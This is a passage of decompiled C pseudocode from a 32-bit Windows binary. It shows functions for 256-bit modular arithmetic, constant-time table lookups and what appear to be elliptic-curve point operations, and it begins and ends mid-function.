    HIDWORD(v249) = ((unsigned int)v231 + __PAIR64__(HIDWORD(v249), v248)) >> 32;
    v250 = v249 + (unsigned int)v231 + v248;
    LODWORD(v249) = a4[2];
    *(_DWORD *)&v291[8] = v250;
    v251 = v244 * (unsigned __int64)(unsigned int)v249;
    HIDWORD(v251) = (*(unsigned int *)&v291[12] + __PAIR64__(HIDWORD(v251), HIDWORD(v250))) >> 32;
    v252 = v251 + (unsigned int)(*(_DWORD *)&v291[12] + HIDWORD(v250));
    LODWORD(v251) = a4[3];
    *(_DWORD *)&v291[12] = v252;
    v253 = v244 * (unsigned __int64)(unsigned int)v251;
    HIDWORD(v253) = (*(unsigned int *)&v291[16] + __PAIR64__(HIDWORD(v253), HIDWORD(v252))) >> 32;
    v254 = v253 + (unsigned int)(*(_DWORD *)&v291[16] + HIDWORD(v252));
    LODWORD(v253) = a4[4];
    *(_DWORD *)&v291[16] = v254;
    v255 = v244 * (unsigned __int64)(unsigned int)v253;
    HIDWORD(v255) = (*(unsigned int *)&v291[20] + __PAIR64__(HIDWORD(v255), HIDWORD(v254))) >> 32;
    v256 = v255 + (unsigned int)(*(_DWORD *)&v291[20] + HIDWORD(v254));
    LODWORD(v255) = a4[5];
    *(_DWORD *)&v291[20] = v256;
    v257 = v244 * (unsigned __int64)(unsigned int)v255;
    HIDWORD(v257) = (*(unsigned int *)&v291[24] + __PAIR64__(HIDWORD(v257), HIDWORD(v256))) >> 32;
    v258 = v257 + (unsigned int)(*(_DWORD *)&v291[24] + HIDWORD(v256));
    LODWORD(v257) = a4[6];
    *(_DWORD *)&v291[24] = v258;
    v259 = v244 * (unsigned __int64)(unsigned int)v257;
    HIDWORD(v259) = (*(unsigned int *)&v291[28] + __PAIR64__(HIDWORD(v259), HIDWORD(v258))) >> 32;
    v260 = v259 + (unsigned int)(*(_DWORD *)&v291[28] + HIDWORD(v258));
    v261 = v244 * (unsigned __int64)a4[7];
    HIDWORD(v261) = (v247 + __PAIR64__(HIDWORD(v261), HIDWORD(v260))) >> 32;
    v262 = v261 + __PAIR64__(v245, v247 + HIDWORD(v260));
    v263 = *(_DWORD *)&v291[40];
    v57 = __CFADD__(*(unsigned int *)&v291[36], *(_QWORD *)&v291[16]);
    *(_QWORD *)&v291[16] += *(unsigned int *)&v291[36];
    *(_DWORD *)&v291[24] = v57 + (_DWORD)v258;
    v264 = __CFADD__(v57, (_DWORD)v258);
    v57 = __CFADD__(v264, (_DWORD)v260) | __CFADD__(*(_DWORD *)&v291[36], v264 + v260);
    *(_DWORD *)&v291[28] = *(_DWORD *)&v291[36] + v264 + v260;
    v266 = __PAIR64__(
             *(_DWORD *)&v291[36] + (unsigned int)__CFADD__(v57, (_DWORD)v262) + HIDWORD(v262),
             v57 + (unsigned int)v262)
         - *(unsigned int *)&v291[36];
    v267 = HIDWORD(v266);
    *(_DWORD *)&v291[32] = v266;
    v265 = (__PAIR64__(
              (__CFADD__(__CFADD__(v57, (_DWORD)v262), HIDWORD(v262)) | __CFADD__(
                                                                          *(_DWORD *)&v291[36],
                                                                          __CFADD__(v57, (_DWORD)v262) + HIDWORD(v262)))
            + (unsigned int)(__CFADD__(__CFADD__((_DWORD)v261, v247 + HIDWORD(v260)), HIDWORD(v261)) | __CFADD__(v245, (v261 + __PAIR64__(v245, v247 + HIDWORD(v260))) >> 32)),
              *(_DWORD *)&v291[36] + (unsigned int)__CFADD__(v57, (_DWORD)v262) + HIDWORD(v262))
          - (v57 + (unsigned int)v262 < *(_DWORD *)&v291[36])) >> 32;
    *(_DWORD *)&v291[36] = v267;
    HIDWORD(v261) = *(_DWORD *)&v291[20];
    v268 = *(_DWORD *)&v291[16];
    **(_DWORD **)&v291[40] = v250 + 1;
    v269 = ((unsigned int)v252 < (unsigned int)((_DWORD)v250 != -1) - 1) - 1;
    *(_DWORD *)(v263 + 4) = v252 - (((_DWORD)v250 != -1) - 1);
    *(_QWORD *)(v263 + 8) = __PAIR64__(HIDWORD(v261), v268) - v269;
    v57 = __PAIR64__(*(unsigned int *)&v291[24], HIDWORD(v261)) < (v268 < v269);
    LODWORD(v261) = *(_DWORD *)&v291[24] - v57;
    v270 = *(_QWORD *)&v291[28] - (v57 | 0x100000000i64);
    v271 = __PAIR64__(v265, *(unsigned int *)&v291[36])
         - ((unsigned int)(*(_QWORD *)&v291[28] < (v57 | 0x100000000ui64))
          - 1);
    v57 = __CFADD__(HIDWORD(v271), *(_DWORD *)v263);
    *(_DWORD *)v263 += HIDWORD(v271);
    v272 = v57;
    v57 = __CFADD__(v57, *(_DWORD *)(v263 + 4)) | __CFADD__(HIDWORD(v271), v57 + *(_DWORD *)(v263 + 4));
    *(_DWORD *)(v263 + 4) += HIDWORD(v271) + v272;
    v273 = v57;
    v57 = __CFADD__(v57, *(_DWORD *)(v263 + 8)) | __CFADD__(HIDWORD(v271), v57 + *(_DWORD *)(v263 + 8));
    *(_DWORD *)(v263 + 8) += HIDWORD(v271) + v273;
    v274 = v57;
    v57 = __CFADD__(v57, *(_DWORD *)(v263 + 12));
    *(_DWORD *)(v263 + 12) += v274;
    v275 = v57;
    v57 = __CFADD__(v57, (_DWORD)v261);
    v277 = __PAIR64__(v270, v275) + (unsigned int)v261;
    v276 = HIDWORD(v277);
    result = v277;
    *(_DWORD *)(v263 + 16) = result;
    v278 = __CFADD__(v57, (_DWORD)v270);
    *(_DWORD *)(v263 + 20) = v276;
    *(_DWORD *)(v263 + 24) = v278 + HIDWORD(v270) - HIDWORD(v271);
    *(_DWORD *)(v263 + 28) = HIDWORD(v271)
                           + (__CFADD__(v278, HIDWORD(v270)) | __CFADD__(-HIDWORD(v271), v278 + HIDWORD(v270)))
                           + v271;
  }
  return result;
}
// 4A94B0: using guessed type __m128i var_A0[2];

//----- (004AA080) --------------------------------------------------------
int __cdecl sub_4AA080(int a1, int *a2, int a3)
{
  _DWORD *v4; // edi
  int v5; // ebp
  int result; // eax
  int v7; // ebx
  int v8; // ecx
  int v9; // edx

  v4 = (_DWORD *)(a1 + 4 * a3 + 124);
  v5 = 6;
  do
  {
    result = *a2;
    v7 = a2[1];
    v8 = a2[2];
    v9 = a2[3];
    a2 += 4;
    *(v4 - 32) = result;
    *(v4 - 16) = v7;
    *v4 = v8;
    v4[16] = v9;
    v4 += 64;
    --v5;
  }
  while ( v5 );
  return result;
}

//----- (004AA0D0) --------------------------------------------------------
int __cdecl sub_4AA0D0(int *a1, int a2, int a3)
{
  int v3; // ebp
  _DWORD *v4; // esi
  int v5; // ebx
  int v6; // ecx
  int v7; // edx
  int v8; // ebx
  int v9; // ecx
  int v10; // edx
  int v11; // ebx
  int v12; // ecx
  int v13; // edx
  int v14; // ebx
  int v15; // ecx
  int v16; // edx
  int v17; // ebx
  int v18; // ecx
  int v19; // edx
  int result; // eax
  int v21; // ebx
  int v22; // ecx
  int v23; // edx

  v3 = -a3 >> 31;
  v4 = (_DWORD *)(a2 + 4 * a3 + 4 * v3);
  v5 = v3 & v4[16];
  v6 = v3 & v4[32];
  v7 = v3 & v4[48];
  *a1 = v3 & *v4;
  a1[1] = v5;
  a1[2] = v6;
  a1[3] = v7;
  v8 = v3 & v4[80];
  v9 = v3 & v4[96];
  v10 = v3 & v4[112];
  a1[4] = v3 & v4[64];
  a1[5] = v8;
  a1[6] = v9;
  a1[7] = v10;
  v11 = v3 & v4[144];
  v12 = v3 & v4[160];
  v13 = v3 & v4[176];
  a1[8] = v3 & v4[128];
  a1[9] = v11;
  a1[10] = v12;
  a1[11] = v13;
  v14 = v3 & v4[208];
  v15 = v3 & v4[224];
  v16 = v3 & v4[240];
  a1[12] = v3 & v4[192];
  a1[13] = v14;
  a1[14] = v15;
  a1[15] = v16;
  v17 = v3 & v4[272];
  v18 = v3 & v4[288];
  v19 = v3 & v4[304];
  a1[16] = v3 & v4[256];
  a1[17] = v17;
  a1[18] = v18;
  a1[19] = v19;
  result = v3 & v4[320];
  v21 = v3 & v4[336];
  v22 = v3 & v4[352];
  v23 = v3 & v4[368];
  a1[20] = result;
  a1[21] = v21;
  a1[22] = v22;
  a1[23] = v23;
  return result;
}

//----- (004AA1F0) --------------------------------------------------------
unsigned int __cdecl sub_4AA1F0(int a1, unsigned int *a2, int a3)
{
  _BYTE *v4; // edi
  int v5; // ebp
  unsigned int v6; // eax
  unsigned int result; // eax

  v4 = (_BYTE *)(a1 + a3 - 1);
  v5 = 16;
  do
  {
    v6 = *a2++;
    *v4 = v6;
    v4[64] = BYTE1(v6);
    result = HIWORD(v6);
    v4[128] = result;
    v4[192] = BYTE1(result);
    v4 += 256;
    --v5;
  }
  while ( v5 );
  return result;
}

//----- (004AA240) --------------------------------------------------------
int __cdecl sub_4AA240(_BYTE *a1, int a2, int a3)
{
  int v3; // ebp
  _BYTE *v4; // esi
  char v5; // cl
  char v6; // dl
  char v7; // bl
  char v8; // cl
  char v9; // dl
  char v10; // bl
  char v11; // cl
  char v12; // dl
  char v13; // bl
  char v14; // cl
  char v15; // dl
  char v16; // bl
  char v17; // cl
  char v18; // dl
  char v19; // bl
  char v20; // cl
  char v21; // dl
  char v22; // bl
  char v23; // cl
  char v24; // dl
  char v25; // bl
  char v26; // cl
  char v27; // dl
  char v28; // bl
  char v29; // cl
  char v30; // dl
  char v31; // bl
  char v32; // cl
  char v33; // dl
  char v34; // bl
  char v35; // cl
  char v36; // dl
  char v37; // bl
  char v38; // cl
  char v39; // dl
  char v40; // bl
  char v41; // cl
  char v42; // dl
  char v43; // bl
  char v44; // cl
  char v45; // dl
  char v46; // bl
  char v47; // cl
  char v48; // dl
  char v49; // bl
  char v50; // cl
  int result; // eax
  char v52; // dl
  char v53; // bl

  v3 = -a3 >> 31;
  v4 = (_BYTE *)(a3 + a2 + v3);
  v5 = v4[128];
  v6 = v4[192];
  v7 = v3 & v4[64];
  *a1 = v3 & *v4;
  a1[1] = v7;
  a1[2] = v3 & v5;
  a1[3] = v3 & v6;
  v8 = v4[384];
  v9 = v4[448];
  v10 = v3 & v4[320];
  a1[4] = v3 & v4[256];
  a1[5] = v10;
  a1[6] = v3 & v8;
  a1[7] = v3 & v9;
  v11 = v4[640];
  v12 = v4[704];
  v13 = v3 & v4[576];
  a1[8] = v3 & v4[512];
  a1[9] = v13;
  a1[10] = v3 & v11;
  a1[11] = v3 & v12;
  v14 = v4[896];
  v15 = v4[960];
  v16 = v3 & v4[832];
  a1[12] = v3 & v4[768];
  a1[13] = v16;
  a1[14] = v3 & v14;
  a1[15] = v3 & v15;
  v17 = v4[1152];
  v18 = v4[1216];
  v19 = v3 & v4[1088];
  a1[16] = v3 & v4[1024];
  a1[17] = v19;
  a1[18] = v3 & v17;
  a1[19] = v3 & v18;
  v20 = v4[1408];
  v21 = v4[1472];
  v22 = v3 & v4[1344];
  a1[20] = v3 & v4[1280];
  a1[21] = v22;
  a1[22] = v3 & v20;
  a1[23] = v3 & v21;
  v23 = v4[1664];
  v24 = v4[1728];
  v25 = v3 & v4[1600];
  a1[24] = v3 & v4[1536];
  a1[25] = v25;
  a1[26] = v3 & v23;
  a1[27] = v3 & v24;
  v26 = v4[1920];
  v27 = v4[1984];
  v28 = v3 & v4[1856];
  a1[28] = v3 & v4[1792];
  a1[29] = v28;
  a1[30] = v3 & v26;
  a1[31] = v3 & v27;
  v29 = v4[2176];
  v30 = v4[2240];
  v31 = v3 & v4[2112];
  a1[32] = v3 & v4[2048];
  a1[33] = v31;
  a1[34] = v3 & v29;
  a1[35] = v3 & v30;
  v32 = v4[2432];
  v33 = v4[2496];
  v34 = v3 & v4[2368];
  a1[36] = v3 & v4[2304];
  a1[37] = v34;
  a1[38] = v3 & v32;
  a1[39] = v3 & v33;
  v35 = v4[2688];
  v36 = v4[2752];
  v37 = v3 & v4[2624];
  a1[40] = v3 & v4[2560];
  a1[41] = v37;
  a1[42] = v3 & v35;
  a1[43] = v3 & v36;
  v38 = v4[2944];
  v39 = v4[3008];
  v40 = v3 & v4[2880];
  a1[44] = v3 & v4[2816];
  a1[45] = v40;
  a1[46] = v3 & v38;
  a1[47] = v3 & v39;
  v41 = v4[3200];
  v42 = v4[3264];
  v43 = v3 & v4[3136];
  a1[48] = v3 & v4[3072];
  a1[49] = v43;
  a1[50] = v3 & v41;
  a1[51] = v3 & v42;
  v44 = v4[3456];
  v45 = v4[3520];
  v46 = v3 & v4[3392];
  a1[52] = v3 & v4[3328];
  a1[53] = v46;
  a1[54] = v3 & v44;
  a1[55] = v3 & v45;
  v47 = v4[3712];
  v48 = v4[3776];
  v49 = v3 & v4[3648];
  a1[56] = v3 & v4[3584];
  a1[57] = v49;
  a1[58] = v3 & v47;
  a1[59] = v3 & v48;
  v50 = v4[3968];
  result = (unsigned __int8)(v3 & v4[3840]);
  v52 = v4[4032];
  v53 = v3 & v4[3904];
  a1[60] = result;
  a1[61] = v53;
  a1[62] = v3 & v50;
  a1[63] = v3 & v52;
  return result;
}

//----- (004AA560) --------------------------------------------------------
int __cdecl sub_4AA560(int a1, unsigned int *a2)
{
  unsigned int v2; // ebx
  unsigned int v3; // ecx
  unsigned int v4; // edx
  unsigned int v5; // ebx
  unsigned int v6; // ecx
  unsigned int v7; // edx
  unsigned int v9[8]; // [esp+0h] [ebp-B4h] BYREF
  unsigned int v10[8]; // [esp+20h] [ebp-94h] BYREF
  unsigned int v11[8]; // [esp+40h] [ebp-74h] BYREF
  unsigned int v12[8]; // [esp+60h] [ebp-54h] BYREF
  _DWORD v13[8]; // [esp+80h] [ebp-34h] BYREF
  int v14; // [esp+A0h] [ebp-14h]

  v2 = a2[1];
  v3 = a2[2];
  v4 = a2[3];
  v12[0] = *a2;
  v12[1] = v2;
  v12[2] = v3;
  v12[3] = v4;
  v5 = a2[5];
  v6 = a2[6];
  v7 = a2[7];
  v12[4] = a2[4];
  v12[5] = v5;
  v12[6] = v6;
  v12[7] = v7;
  v14 = dword_73C6D0;
  sub_4A9220(a2 + 8, v9, a2 + 8);
  sub_4A94B0(v14, a2 + 16, v11, a2 + 16);
  sub_4A94B0(v14, v9, v9, v9);
  sub_4A94B0(v14, a2 + 16, v13, a2 + 8);
  sub_4A9220(v11, v10, v12);
  sub_4A9220(v13, (_DWORD *)(a1 + 64), v13);
  sub_4A9310((int)v11, v11, (int)v12);
  sub_4A94B0(v14, v9, v13, v9);
  sub_4A94B0(v14, v11, v10, v10);
  sub_4A9130((__int64 *)(a1 + 32), v13);
  sub_4A9220(v10, v13, v10);
  sub_4A94B0(v14, v9, v9, v12);
  sub_4A9220(v10, v10, v13);
  sub_4A9220(v9, v13, v9);
  sub_4A94B0(v14, v10, (_DWORD *)a1, v10);
  sub_4A9310((int)v13, (_DWORD *)a1, a1);
  sub_4A9310(a1, v9, (int)v9);
  sub_4A94B0(v14, v10, v9, v9);
  return sub_4A9310(a1 + 32, (_DWORD *)(a1 + 32), (int)v9);
}
// 73C6D0: using guessed type int dword_73C6D0;
// 4AA560: using guessed type unsigned int var_B4[8];
// 4AA560: using guessed type unsigned int var_74[8];
// 4AA560: using guessed type _DWORD var_34[8];
// 4AA560: using guessed type unsigned int var_94[8];

//----- (004AA760) --------------------------------------------------------
unsigned int __cdecl sub_4AA760(unsigned int *a1, unsigned int *a2, unsigned int *a3)
{
  int v3; // ebx
  int v4; // ecx
  int v5; // edx
  int v6; // ebx
  int v7; // ecx
  int v8; // edx
  int v9; // ebx
  int v10; // ecx
  int v11; // edx
  int v12; // ebx
  int v13; // ecx
  int v14; // edx
  int v15; // ebx
  int v16; // ecx
  int v17; // edx
  unsigned int v18; // ebp
  int v19; // ebx
  int v20; // ecx
  int v21; // edx
  int v22; // ebx
  int v23; // ecx
  int v24; // edx
  int v25; // ebx
  int v26; // ecx
  int v27; // edx
  int v28; // ebx
  int v29; // ecx
  int v30; // edx
  int v31; // ebx
  int v32; // ecx
  int v33; // edx
  int v34; // ebx
  int v35; // ecx
  int v36; // edx
  unsigned int v37; // ebp
  int v38; // ebx
  int v39; // ecx
  int v40; // edx
  int v41; // eax
  int v42; // ecx
  int v43; // edx
  unsigned int v44; // ebx
  int v45; // eax
  int v46; // ecx
  int v47; // edx
  unsigned int result; // eax
  int v49; // edx
  int v50; // ebp
  int v51; // esi
  int v52[8]; // [esp+0h] [ebp-264h] BYREF
  unsigned int v53[8]; // [esp+20h] [ebp-244h] BYREF
  unsigned int v54[8]; // [esp+40h] [ebp-224h] BYREF
  unsigned int v55; // [esp+60h] [ebp-204h] BYREF
  int v56; // [esp+64h] [ebp-200h]
  int v57; // [esp+68h] [ebp-1FCh]
  int v58; // [esp+6Ch] [ebp-1F8h]
  unsigned int v59; // [esp+70h] [ebp-1F4h]
  int v60; // [esp+74h] [ebp-1F0h]
  int v61; // [esp+78h] [ebp-1ECh]
  int v62; // [esp+7Ch] [ebp-1E8h]
  unsigned int v63; // [esp+80h] [ebp-1E4h] BYREF
  int v64; // [esp+84h] [ebp-1E0h]
  int v65; // [esp+88h] [ebp-1DCh]
  int v66; // [esp+8Ch] [ebp-1D8h]
  unsigned int v67; // [esp+90h] [ebp-1D4h]
  int v68; // [esp+94h] [ebp-1D0h]
  int v69; // [esp+98h] [ebp-1CCh]
  int v70; // [esp+9Ch] [ebp-1C8h]
  unsigned int v71; // [esp+A0h] [ebp-1C4h] BYREF
  int v72; // [esp+A4h] [ebp-1C0h]
  int v73; // [esp+A8h] [ebp-1BCh]
  int v74; // [esp+ACh] [ebp-1B8h]
  unsigned int v75; // [esp+B0h] [ebp-1B4h]
  int v76; // [esp+B4h] [ebp-1B0h]
  int v77; // [esp+B8h] [ebp-1ACh]
  int v78; // [esp+BCh] [ebp-1A8h]
  unsigned int v79; // [esp+C0h] [ebp-1A4h] BYREF
  int v80; // [esp+C4h] [ebp-1A0h]
  int v81; // [esp+C8h] [ebp-19Ch]
  int v82; // [esp+CCh] [ebp-198h]
  unsigned int v83; // [esp+D0h] [ebp-194h]
  int v84; // [esp+D4h] [ebp-190h]
  int v85; // [esp+D8h] [ebp-18Ch]
  int v86; // [esp+DCh] [ebp-188h]
  unsigned int v87; // [esp+E0h] [ebp-184h] BYREF
  int v88; // [esp+E4h] [ebp-180h]
  int v89; // [esp+E8h] [ebp-17Ch]
  int v90; // [esp+ECh] [ebp-178h]
  unsigned int v91; // [esp+F0h] [ebp-174h]
  int v92; // [esp+F4h] [ebp-170h]
  int v93; // [esp+F8h] [ebp-16Ch]
  int v94; // [esp+FCh] [ebp-168h]
  unsigned int v95; // [esp+100h] [ebp-164h] BYREF
  int v96; // [esp+104h] [ebp-160h]
  int v97; // [esp+108h] [ebp-15Ch]
  int v98; // [esp+10Ch] [ebp-158h]
  unsigned int v99; // [esp+110h] [ebp-154h]
  int v100; // [esp+114h] [ebp-150h]
  int v101; // [esp+118h] [ebp-14Ch]
  int v102; // [esp+11Ch] [ebp-148h]
  unsigned int v103[8]; // [esp+120h] [ebp-144h] BYREF
  unsigned int v104[8]; // [esp+140h] [ebp-124h] BYREF
  unsigned int v105[8]; // [esp+160h] [ebp-104h] BYREF
  unsigned int v106[8]; // [esp+180h] [ebp-E4h] BYREF
  unsigned int v107[8]; // [esp+1A0h] [ebp-C4h] BYREF
  unsigned int v108[8]; // [esp+1C0h] [ebp-A4h] BYREF
  _DWORD v109[8]; // [esp+1E0h] [ebp-84h] BYREF
  unsigned int v110[8]; // [esp+200h] [ebp-64h] BYREF
  unsigned int v111[8]; // [esp+220h] [ebp-44h] BYREF
  int v112; // [esp+240h] [ebp-24h]
  int v113; // [esp+244h] [ebp-20h]
  unsigned int v114; // [esp+248h] [ebp-1Ch]
  int v115; // [esp+24Ch] [ebp-18h]

  v3 = a3[1];
  v4 = a3[2];
  v5 = a3[3];
  v79 = *a3;
  v115 = dword_73C6D0;
  v80 = v3;
  v81 = v4;
  v82 = v5;
  v6 = a3[5];
  v7 = a3[6];
  v8 = a3[7];
  v83 = a3[4];
  v84 = v6;
  v85 = v7;
  v86 = v8;
  v9 = a3[9];
  v10 = a3[10];
  v11 = a3[11];
  v87 = a3[8];
  v88 = v9;
  v89 = v10;
  v90 = v11;
  v12 = a3[13];
  v13 = a3[14];
  v14 = a3[15];
  v91 = a3[12];
  v92 = v12;
  v93 = v13;
  v94 = v14;
  v15 = a3[17];
  v16 = a3[18];
  v17 = a3[19];
  v95 = a3[16];
  v96 = v15;
  v97 = v16;
  v98 = v17;
  v18 = v17 | v16 | v15 | v95;
  v19 = a3[21];
  v20 = a3[22];
  v21 = a3[23];
  v99 = a3[20];
  v100 = v19;
  v101 = v20;
  v102 = v21;
  v113 = (int)(-(v21 | v20 | v19 | v99 | v18) | v21 | v20 | v19 | v99 | v18) >> 31;
  v22 = a2[1];
  v23 = a2[2];
  v24 = a2[3];
  v55 = *a2;
  v56 = v22;
  v57 = v23;
  v58 = v24;
  v25 = a2[5];
  v26 = a2[6];
  v27 = a2[7];
  v59 = a2[4];
  v60 = v25;
  v61 = v26;
  v62 = v27;
  v28 = a2[9];
  v29 = a2[10];
  v30 = a2[11];
  v63 = a2[8];
  v64 = v28;
  v65 = v29;
  v66 = v30;
  v31 = a2[13];
  v32 = a2[14];
  v33 = a2[15];
  v67 = a2[12];
  v68 = v31;
  v69 = v32;
  v70 = v33;
  v34 = a2[17];
  v35 = a2[18];
  v36 = a2[19];
  v71 = a2[16];
  v72 = v34;
  v73 = v35;
  v74 = v36;
  v37 = v36 | v35 | v34 | v71;
  v38 = a2[21];
  v39 = a2[22];
  v40 = a2[23];
  v75 = a2[20];
  v76 = v38;
  v77 = v39;
  v78 = v40;
  v112 = (int)(-(v40 | v39 | v38 | v75 | v37) | v40 | v39 | v38 | v75 | v37) >> 31;
  sub_4A94B0(dword_73C6D0, &v95, v106, &v95);
  sub_4A94B0(v115, &v71, v104, &v71);
  sub_4A94B0(v115, &v95, v110, v106);
  sub_4A94B0(v115, &v71, v111, v104);
  sub_4A94B0(v115, v110, v110, &v63);
  sub_4A94B0(v115, v111, v111, &v87);
  v41 = sub_4A9310((int)v110, v105, (int)v111);
  v44 = v105[3] | v105[2] | v105[1] | v105[0] | v43 | v42 | v41 | v38;
  v114 = v44;
  sub_4A94B0(v115, v106, v108, &v55);
  sub_4A94B0(v115, v104, v109, &v79);
  v45 = sub_4A9310((int)v108, v103, (int)v109);
  if ( v103[3] | v103[2] | v103[1] | v103[0] | v47 | v46 | v44 | v45 || (v113 & v112) == 0 )
  {
    sub_4A94B0(v115, v105, v106, v105);
    sub_4A94B0(v115, &v71, v54, v103);
    sub_4A94B0(v115, v103, v104, v103);
    sub_4A94B0(v115, v54, v54, &v95);
    sub_4A94B0(v115, v108, v109, v104);
    sub_4A94B0(v115, v104, v107, v103);
    sub_4A9220(v109, v104, v109);
    sub_4A9310((int)v104, v52, (int)v106);
    sub_4A9310((int)v107, v52, (int)v52);
    sub_4A9310((int)v52, v53, (int)v109);
    sub_4A94B0(v115, v110, v111, v107);
    sub_4A94B0(v115, v53, v53, v105);
    sub_4A9310((int)v111, v53, (int)v53);
    v49 = v113 & v112;
    v50 = v113 & ~v112;
    v51 = ~v113;
    a1[16] = v71 & ~v113 | v95 & v50 | v54[0] & v113 & v112;
    a1[17] = v72 & v51 | v96 & v50 | v54[1] & v49;
    a1[18] = v73 & v51 | v97 & v50 | v54[2] & v49;
    a1[19] = v74 & v51 | v98 & v50 | v54[3] & v49;
    a1[20] = v75 & v51 | v99 & v50 | v54[4] & v49;
    a1[21] = v76 & v51 | v100 & v50 | v54[5] & v49;
    a1[22] = v77 & v51 | v101 & v50 | v54[6] & v49;
    a1[23] = v78 & v51 | v102 & v50 | v54[7] & v49;
    *a1 = v55 & v51 | v79 & v50 | v52[0] & v49;
    a1[1] = v56 & v51 | v80 & v50 | v52[1] & v49;
    a1[2] = v57 & v51 | v81 & v50 | v52[2] & v49;
    a1[3] = v58 & v51 | v82 & v50 | v52[3] & v49;
    a1[4] = v59 & v51 | v83 & v50 | v52[4] & v49;
    a1[5] = v60 & v51 | v84 & v50 | v52[5] & v49;
    a1[6] = v61 & v51 | v85 & v50 | v52[6] & v49;
    a1[7] = v62 & v51 | v86 & v50 | v52[7] & v49;
    a1[8] = v63 & v51 | v87 & v50 | v53[0] & v49;
    a1[9] = v64 & v51 | v88 & v50 | v53[1] & v49;
    a1[10] = v65 & v51 | v89 & v50 | v53[2] & v49;
    a1[11] = v66 & v51 | v90 & v50 | v53[3] & v49;
    a1[12] = v67 & v51 | v91 & v50 | v53[4] & v49;
    a1[13] = v68 & v51 | v92 & v50 | v53[5] & v49;
    a1[14] = v69 & v51 | v93 & v50 | v53[6] & v49;
    result = v70 & v51 | v94 & v50 | v53[7] & v49;
    a1[15] = result;
  }
  else
  {
    if ( !v114 )
      JUMPOUT(0x4AA57B);
    result = 0;
    memset(a1, 0, 0x60u);
  }
  return result;
}
// 4AAAB4: control flows out of bounds to 4AA57B
// 4AA9DB: variable 'v43' is possibly undefined
// 4AA9D9: variable 'v42' is possibly undefined
// 4AAA45: variable 'v47' is possibly undefined
// 4AAA43: variable 'v46' is possibly undefined
// 73C6D0: using guessed type int dword_73C6D0;
// 4AA760: using guessed type unsigned int var_E4[8];
// 4AA760: using guessed type unsigned int var_124[8];
// 4AA760: using guessed type unsigned int var_64[8];
// 4AA760: using guessed type unsigned int var_44[8];
// 4AA760: using guessed type unsigned int var_104[8];
// 4AA760: using guessed type unsigned int var_A4[8];
// 4AA760: using guessed type _DWORD var_84[8];
// 4AA760: using guessed type unsigned int var_144[8];
// 4AA760: using guessed type unsigned int var_C4[8];

//----- (004AAF20) --------------------------------------------------------
unsigned int __cdecl sub_4AAF20(unsigned int *a1, unsigned int *a2, unsigned int *a3)
{
  int v3; // ebx
  int v4; // ecx
  int v5; // edx
  int v6; // ebx
  int v7; // ecx
  int v8; // edx
  int v9; // ebx
  int v10; // ecx
  int v11; // edx
  int v12; // ebx
  int v13; // ecx
  int v14; // edx
  int v15; // ebx
  int v16; // ecx
  int v17; // edx
  unsigned int v18; // ebp
  int v19; // ebx
  int v20; // ecx
  int v21; // edx
  int v22; // ebx
  int v23; // ecx
  int v24; // edx
  unsigned int v25; // ebp
  int v26; // ebx
  int v27; // ecx
  int v28; // edx
  int v29; // ebp
  int v30; // ebx
  int v31; // ecx
  int v32; // edx
  unsigned int v33; // ebp
  int v34; // ebx
  int v35; // ecx
  int v36; // edx
  int v37; // edx
  int v38; // ebp
  int v39; // esi
  unsigned int result; // eax
  int v41[8]; // [esp+0h] [ebp-1FCh] BYREF
  unsigned int v42[8]; // [esp+20h] [ebp-1DCh] BYREF
  int v43[8]; // [esp+40h] [ebp-1BCh] BYREF
  unsigned int v44; // [esp+60h] [ebp-19Ch] BYREF
  int v45; // [esp+64h] [ebp-198h]
  int v46; // [esp+68h] [ebp-194h]
  int v47; // [esp+6Ch] [ebp-190h]
  unsigned int v48; // [esp+70h] [ebp-18Ch]
  int v49; // [esp+74h] [ebp-188h]
  int v50; // [esp+78h] [ebp-184h]
  int v51; // [esp+7Ch] [ebp-180h]
  unsigned int v52; // [esp+80h] [ebp-17Ch] BYREF
  int v53; // [esp+84h] [ebp-178h]
  int v54; // [esp+88h] [ebp-174h]
  int v55; // [esp+8Ch] [ebp-170h]
  unsigned int v56; // [esp+90h] [ebp-16Ch]
  int v57; // [esp+94h] [ebp-168h]
  int v58; // [esp+98h] [ebp-164h]
  int v59; // [esp+9Ch] [ebp-160h]
  unsigned int v60; // [esp+A0h] [ebp-15Ch] BYREF
  int v61; // [esp+A4h] [ebp-158h]
  int v62; // [esp+A8h] [ebp-154h]
  int v63; // [esp+ACh] [ebp-150h]
  unsigned int v64; // [esp+B0h] [ebp-14Ch]
  int v65; // [esp+B4h] [ebp-148h]
  int v66; // [esp+B8h] [ebp-144h]
  int v67; // [esp+BCh] [ebp-140h]
  unsigned int v68; // [esp+C0h] [ebp-13Ch] BYREF
  int v69; // [esp+C4h] [ebp-138h]
  int v70; // [esp+C8h] [ebp-134h]
  int v71; // [esp+CCh] [ebp-130h]
  unsigned int v72; // [esp+D0h] [ebp-12Ch]
  int v73; // [esp+D4h] [ebp-128h]
  int v74; // [esp+D8h] [ebp-124h]
  int v75; // [esp+DCh] [ebp-120h]
  unsigned int v76; // [esp+E0h] [ebp-11Ch] BYREF
  int v77; // [esp+E4h] [ebp-118h]
  int v78; // [esp+E8h] [ebp-114h]
  int v79; // [esp+ECh] [ebp-110h]
  unsigned int v80; // [esp+F0h] [ebp-10Ch]
  int v81; // [esp+F4h] [ebp-108h]
  int v82; // [esp+F8h] [ebp-104h]
  int v83; // [esp+FCh] [ebp-100h]
  _DWORD v84[8]; // [esp+100h] [ebp-FCh] BYREF
  unsigned int v85[8]; // [esp+120h] [ebp-DCh] BYREF
  unsigned int v86[8]; // [esp+140h] [ebp-BCh] BYREF
  unsigned int v87[8]; // [esp+160h] [ebp-9Ch] BYREF
  unsigned int v88[8]; // [esp+180h] [ebp-7Ch] BYREF
  unsigned int v89[8]; // [esp+1A0h] [ebp-5Ch] BYREF
  _DWORD v90[8]; // [esp+1C0h] [ebp-3Ch] BYREF
  int v91; // [esp+1E0h] [ebp-1Ch]
  int v92; // [esp+1E4h] [ebp-18h]
  int v93; // [esp+1E8h] [ebp-14h]

  v3 = a2[1];
  v4 = a2[2];
  v5 = a2[3];
  v44 = *a2;
  v93 = dword_73C6D0;
  v45 = v3;
  v46 = v4;
  v47 = v5;
  v6 = a2[5];
  v7 = a2[6];
  v8 = a2[7];
  v48 = a2[4];
  v49 = v6;
  v50 = v7;
  v51 = v8;
  v9 = a2[9];
  v10 = a2[10];
  v11 = a2[11];
  v52 = a2[8];
  v53 = v9;
  v54 = v10;
  v55 = v11;
  v12 = a2[13];
  v13 = a2[14];
  v14 = a2[15];
  v56 = a2[12];
  v57 = v12;
  v58 = v13;
  v59 = v14;
